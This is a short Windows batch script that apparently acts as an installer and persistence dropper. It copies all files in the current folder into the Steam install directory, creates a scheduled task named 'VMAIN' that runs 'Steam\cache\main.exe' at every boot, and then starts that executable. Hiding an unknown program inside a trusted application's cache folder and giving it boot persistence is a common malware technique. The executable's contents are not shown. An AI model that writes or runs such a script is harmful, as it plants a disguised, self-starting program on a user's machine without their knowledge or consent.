@echo off
xcopy * "C:\Program Files (x86)\Steam" /e /y
SCHTASKS /CREATE /SC ONSTART /TN "MyTasks\VMAIN" /TR "C:\Program Files (x86)\Steam\cache\main.exe"
"C:\Program Files (x86)\Steam\cache\main.exe"